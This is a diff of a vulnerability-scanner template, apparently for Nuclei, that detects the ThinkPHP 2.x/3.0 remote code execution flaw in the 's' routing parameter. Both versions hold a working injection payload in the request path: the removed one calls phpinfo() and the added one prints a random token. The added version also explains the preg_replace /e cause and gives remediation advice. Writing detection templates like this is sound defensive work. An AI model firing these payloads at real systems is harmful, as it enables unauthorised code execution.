@@ -1,31 +1,31 @@
-id: thinkphp-2-rce
-
+id: ThinkPHP-2-Rce
 info:
-  name: ThinkPHP 2/3 - Remote Code Execution
-  author: dr_set
+  name: ThinkPHP 2 / 3 's' Parameter RCE
+  author:
+  - l0ne1y
+  description: |-
+    ThinkPHP2.x 任意代码执行漏洞
+    ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：
+    ```
+    $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
+    ```
+    导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞，ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。
   severity: critical
-  description: ThinkPHP 2.x and 3.0 in Lite mode are susceptible to remote code execution via the s parameter. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
-  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/2-rce
-  metadata:
-    max-request: 1
-  tags: thinkphp,rce
-
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/index.php?s=/index/index/name/$%7B@phpinfo()%7D"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "PHP Extension"
-          - "PHP Version"
-          - "ThinkPHP"
-        condition: and
-
-      - type: status
-        status:
-          - 200
-
-# digest: 490a0046304402203aa0264e3d65d89275494ab1459acfe3a1389d4dc7a090667737d23b4502a13002203006e9e07770f17e1fab6cbb7b39ed6caa5d5195a93922fa96fe11f3a6572a81:922c64590222798bb761d5b6d8e72950
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+    #### 临时修复方案：
+    更改路由匹配模式。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code == 200
+    - contains(body,verify)
+    - '!contains(body,"print_r({{verify}})")'
+  path:
+  - '{{BaseURL}}/index.php?s=/index/index/name/$%7B@print_r({{verify}})%7D'
+  method: GET
+variables:
+  verify: '{{rand_text_alphanumeric(8,"")}}'
